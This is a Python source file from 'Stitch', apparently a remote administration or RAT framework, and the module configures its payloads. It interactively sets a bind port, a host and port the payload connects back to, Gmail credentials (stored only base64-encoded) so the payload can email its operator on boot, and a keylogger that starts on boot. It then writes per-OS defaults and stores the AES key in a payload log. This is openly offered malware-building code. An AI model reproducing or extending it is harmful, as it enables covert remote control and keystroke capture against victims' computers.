#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import *

class stitch_ini():
    def __init__(self):
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(st_config)
        if windows_client():
            self.section = "Windows"
        elif osx_client():
            self.section = "Mac"
        elif linux_client():
            self.section = "Linux"

    def get_value(self,key):
        self.Config.read(st_config)
        return self.Config.get(self.section,key)

    def get_bool(self,key):
        self.Config.read(st_config)
        return self.Config.getboolean(self.section,key)

    def set_value(self,key,value):
        self.Config.read(st_config)
        self.Config.set(self.section,key,value)
        with open(st_config, 'w') as configfile:
            self.Config.write(configfile)

def create_new_config():
    BIND = False
    BHOST = ""
    BPORT = ""

    LISTEN = False
    LHOST = ""
    LPORT = ""

    KEYLOGGER_BOOT = False

    st_bind = ''
    while st_bind != "y" and st_bind != "yes" and st_bind != "n" and st_bind != "no":
        st_bind = raw_input('\nWould you like the payload to bind itself? [Y/N]: ').lower()
    if st_bind.startswith('y'):
        BIND = True
    elif st_bind.startswith('n'):
        BIND = False

    if BIND:
        st_bhost = raw_input('\nEnter the host IP you want the payload to bind to. (Leave empty to allow all IPs): ').lower()
        BHOST = st_bhost

        st_bport = raw_input('Enter the port you want the payload to bind itself to?: ').lower()
        while not check_int(st_bport):
            st_bport = raw_input('\nEnter the port you want the payload to bind itself to?: ').lower()
        BPORT = st_bport
    else:
        BHOST = ""
        BPORT = ""

    st_conn = ''
    while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
        st_conn = raw_input('\nWould you like the payload to connect to a host? [Y/N]:  ').lower()
    if st_conn.startswith('y'):
        LISTEN = True
    elif st_conn.startswith('n'):
        LISTEN = False

    if LISTEN:
        st_chost = raw_input('\nEnter the host IP you want the payload to connect to: ').lower()
        LHOST = st_chost

        st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
        while not check_int(st_cport):
            st_cport = raw_input('Enter the port on "{}" that you want the payload to connect to: '.format(st_chost)).lower()
        LPORT = st_cport
    else:
        LHOST = ""
        LPORT = ""

    st_email = ''
    while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
        st_email = raw_input('\nWould you like the payload to email you on boot? [Y/N]:  ').lower()
    if st_email.startswith('y'):
        EMAIL = True
    elif st_email.startswith('n'):
        EMAIL = False

    if EMAIL:
        while True:
            GMAIL_USER = raw_input('\nEnter a valid gmail address you want the payload to use: ').lower()
            if '@gmail.com' in GMAIL_USER:
                break
        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)))
    else:
        GMAIL_USER = "None"
        GMAIL_PWD = ""

    st_klboot = ''
    while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
        st_klboot = raw_input('\nWould you like the keylogger to start on boot? [Y/N]:  ').lower()
    if st_klboot.startswith('y'):
        KEYLOGGER_BOOT = True
    elif st_klboot.startswith('n'):
        KEYLOGGER_BOOT = False

    stini = stitch_ini()
    stini.set_value('BIND', BIND)
    stini.set_value('BHOST',BHOST)
    stini.set_value('BPORT',BPORT)
    stini.set_value('LISTEN',LISTEN)
    stini.set_value('LHOST',LHOST)
    stini.set_value('LPORT',LPORT)
    stini.set_value('EMAIL',GMAIL_USER)
    stini.set_value('EMAIL_PWD',GMAIL_PWD)
    stini.set_value('KEYLOGGER_BOOT',KEYLOGGER_BOOT)

    return confirm_config()

def confirm_config():
    clear_screen()
    print_st_config()
    cur_config = raw_input("Would you like to use the current configurations? [Y/N]: ").lower()
    if cur_config.startswith('yes') or cur_config == 'y':
        return True
    elif cur_config.startswith('no') or cur_config == 'n':
        return create_new_config()
    else:
        return False

def get_conf_dir():
    i = 1
    while os.path.exists(os.path.join(payloads_path,'config{}'.format(i))):
        i += 1
    conf_dir = os.path.join(payloads_path,'config{}'.format(i))
    os.makedirs(conf_dir)

    with open(st_config,'rb') as sc:
        content=sc.read()
        content += "AES Encryption Key: {}".format(aes_encoded)
        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'wb') as pc:
            pc.write(content)

    return conf_dir

def print_st_config():
    stini = stitch_ini()

    BIND = stini.get_bool("BIND")
    BHOST = stini.get_value("BHOST")
    BPORT = stini.get_value("BPORT")

    LISTEN = stini.get_bool("LISTEN")
    LHOST = stini.get_value("LHOST")
    LPORT = stini.get_value("LPORT")

    EMAIL = stini.get_value("EMAIL")
    KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")
    st_print("=== Stitch {} Configuration ===".format(stini.section))
    print '''
    BIND = {}
    BHOST = {}
    BPORT = {}

    LISTEN = {}
    LHOST = {}
    LPORT = {}

    GMAIL = {}
    KEYLOGGER_BOOT = {}\n\n'''.format(BIND,BHOST,BPORT,LISTEN,LHOST,LPORT,EMAIL,KEYLOGGER_BOOT)

def gen_default_st_config():
    with open(st_config, 'wb') as sc:
        content = '''
[Windows]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False

[Mac]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False

[Linux]
BIND = True
BHOST =
BPORT = 4433

LISTEN= True
LHOST = localhost
LPORT = 4455

EMAIL = None
EMAIL_PWD =
KEYLOGGER_BOOT = False'''
        sc.write(content)
